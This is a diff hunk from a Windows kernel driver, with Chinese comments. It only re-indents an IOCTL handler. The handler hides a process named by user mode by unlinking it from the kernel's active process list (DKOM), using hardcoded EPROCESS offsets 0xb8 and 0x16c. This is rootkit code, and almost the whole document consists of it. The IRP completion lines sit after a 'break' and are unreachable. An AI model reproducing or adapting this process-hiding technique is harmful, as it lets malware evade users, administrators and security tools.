@@ -115,42 +115,42 @@ NTSTATUS DeviceCtrl(DEVICE_OBJECT* device, IRP* irp)
 	//选择控制码
     switch (ctrlCode)
 	{
-	//HideProcess
-	case DF_GET_PROC_HIDE:
-	{		
-		//进程名称
-		char* ProcName = NULL;
-		ProcName = (char*)pInputBuff;		
-		//获取当前进程对象
-		PEPROCESS NowProc = PsGetCurrentProcess();
-		//获取进程对象内的当前活动进程链表
-		LIST_ENTRY* pNowList = (LIST_ENTRY*)((ULONG)NowProc + 0xb8);
-		//临时链表
-		LIST_ENTRY* pTempList = pNowList;
-		//遍历链表
-		while (pNowList != pTempList->Flink)
-		{
-			//相对进程对象偏移0x16c保存的是ImageFileName,
-			//当前相对进程对象偏移是0xb8，需要减去			
-			if (!strcmp(ProcName, (char*)
-				((ULONG)pTempList - 0xb8 + 0x16c)))
+		//HideProcess
+		case DF_GET_PROC_HIDE:
+		{		
+			//进程名称
+			char* ProcName = NULL;
+			ProcName = (char*)pInputBuff;		
+			//获取当前进程对象
+			PEPROCESS NowProc = PsGetCurrentProcess();
+			//获取进程对象内的当前活动进程链表
+			LIST_ENTRY* pNowList = (LIST_ENTRY*)((ULONG)NowProc + 0xb8);
+			//临时链表
+			LIST_ENTRY* pTempList = pNowList;
+			//遍历链表
+			while (pNowList != pTempList->Flink)
 			{
-				//把找到的进程从链表中删除
-				(pTempList->Blink)->Flink = pTempList->Flink;
-				(pTempList->Flink)->Blink = pTempList->Blink;
+				//相对进程对象偏移0x16c保存的是ImageFileName,
+				//当前相对进程对象偏移是0xb8，需要减去			
+				if (!strcmp(ProcName, (char*)
+					((ULONG)pTempList - 0xb8 + 0x16c)))
+				{
+					//把找到的进程从链表中删除
+					(pTempList->Blink)->Flink = pTempList->Flink;
+					(pTempList->Flink)->Blink = pTempList->Blink;
 				
-				pTempList->Flink = pTempList->Blink = NULL;
-				KdPrint(("成功删除程序链表节点\n"));				
-				break;
+					pTempList->Flink = pTempList->Blink = NULL;
+					KdPrint(("成功删除程序链表节点\n"));				
+					break;
+				}
+				pTempList = pTempList->Flink;
 			}
-			pTempList = pTempList->Flink;
 		}
-	}
-	break;
+		break;
 	
-	irp->IoStatus.Status = STATUS_SUCCESS;
-	irp->IoStatus.Information = inputSize;
-	IoCompleteRequest(irp, IO_NO_INCREMENT);
-	return status;
+		irp->IoStatus.Status = STATUS_SUCCESS;
+		irp->IoStatus.Information = inputSize;
+		IoCompleteRequest(irp, IO_NO_INCREMENT);
+		return status;
 	}
 }
